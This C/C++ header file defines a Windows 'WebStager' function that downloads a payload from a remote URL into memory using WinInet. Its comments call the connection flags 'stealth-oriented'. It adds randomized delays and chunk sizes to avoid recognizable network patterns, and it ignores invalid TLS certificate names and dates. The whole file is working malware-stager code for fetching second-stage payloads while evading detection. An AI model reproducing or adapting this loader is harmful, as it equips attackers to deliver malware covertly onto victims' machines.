#pragma once
#include <WinInet.h>
#include <ctime>

#pragma comment (lib, "Wininet.lib")

// WebStager function
BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0, chunkSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;
    HANDLE hHeap = GetProcessHeap();
    HANDLE hRandomDelay = NULL;

    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Create event for randomized delays
    hRandomDelay = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hRandomDelay == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Initial random delay to avoid immediate connection patterns
    WaitForSingleObject(hRandomDelay, rand() % 500);

    // Open internet session with user-specified agent
    hInternet = InternetOpenW(
        szUserAgent,
        NULL,
        NULL,
        NULL,
        NULL
    );
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Delay before URL connection
    WaitForSingleObject(hRandomDelay, rand() % 400);

    // Open URL with stealth-oriented connection flags
    hInternetFile = InternetOpenUrlW(
        hInternet,
        szUrl,
        NULL,
        0,
        //INTERNET_FLAG_SECURE |
        INTERNET_FLAG_EXISTING_CONNECT |
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
        INTERNET_FLAG_HYPERLINK,
        0
    );
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Pause before buffer allocation
    WaitForSingleObject(hRandomDelay, rand() % 300);

    // Allocate temporary buffer for chunk reading
    pTmpBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    // Short delay before reading
    WaitForSingleObject(hRandomDelay, rand() % 100);

    while (TRUE) {
        // Randomize chunk size
        chunkSize = 512 + (rand() % 1024);

        // Read file in variable-sized chunks
        if (!InternetReadFile(hInternetFile, pTmpBytes, chunkSize, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        // Random inter-chunk delay
        WaitForSingleObject(hRandomDelay, rand() % 100);

        sSize += dwBytesRead;

        // Dynamically allocate and resize payload buffer
        if (pBytes == NULL)
            pBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBytesRead);
        else
            pBytes = (PBYTE)HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, pBytes, sSize);

        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        // Copy chunk to payload buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        SecureZeroMemory(pTmpBytes, dwBytesRead);

        // Stop reading if last chunk is smaller than expected
        if (dwBytesRead < chunkSize)
            break;
    }

    // Final delay before returning payload
    WaitForSingleObject(hRandomDelay, rand() % 200);

    // Return payload details
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    // Cleanup resources
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (pTmpBytes)
        HeapFree(hHeap, 0, pTmpBytes);
    if (hRandomDelay)
        CloseHandle(hRandomDelay);

    return bSTATE;
}
